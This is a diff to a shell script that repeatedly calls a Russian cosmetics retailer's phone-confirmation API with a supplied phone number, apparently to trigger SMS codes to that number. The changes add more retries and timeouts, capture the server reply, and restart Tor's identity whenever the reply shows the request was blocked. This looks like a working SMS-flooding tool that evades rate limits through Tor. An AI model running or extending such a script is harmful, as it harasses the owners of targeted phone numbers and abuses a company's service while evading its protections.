@@ -5,7 +5,8 @@ echo "$PHONE"
 COOKIEFILE="$RANDOM"cookie.txt
 
 curl -s 'https://www.letu.ru/rest/model/atg/rest/SessionConfirmationActor/getSessionConfirmationNumber' \
-  --retry 5 \
+  --retry 30 \
+  -m 60 --connect-timeout 20 \
   -c "$COOKIEFILE" -b "$COOKIEFILE" \
   -H 'authority: www.letu.ru' \
   -H 'dnt: 1' \
@@ -23,8 +24,9 @@ curl -s 'https://www.letu.ru/rest/model/atg/rest/SessionConfirmationActor/getSes
 
 #cat cookie.txt
 
-curl -s 'https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU' \
-  --retry 5 \
+RESULT="$(curl -s 'https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU' \
+  --retry 30 \
+  -m 60 --connect-timeout 20 \
   -c "$COOKIEFILE" -b "$COOKIEFILE" \
   -H 'authority: www.letu.ru' \
   -H 'dnt: 1' \
@@ -41,10 +43,14 @@ curl -s 'https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=
   -H 'referer: https://www.letu.ru/browse/clean-beauty' \
   -H 'accept-language: ru-UA,ru;q=0.9,en-US;q=0.8,en;q=0.7,ru-RU;q=0.6' \
   --data-raw '{"phoneNumber":"'"$PHONE"'","captcha":false}' \
-  --compressed
+  --compressed)"
 
 rm -rf "$COOKIEFILE"
+echo "$RESULT"
 echo ""
 
-pkill -sighup tor 2>/dev/null
+if [ "$(echo "$RESULT" | grep -c "{")" = "0" ]; then
+  echo ""
+  pkill -sighup tor 2>/dev/null
+fi
 
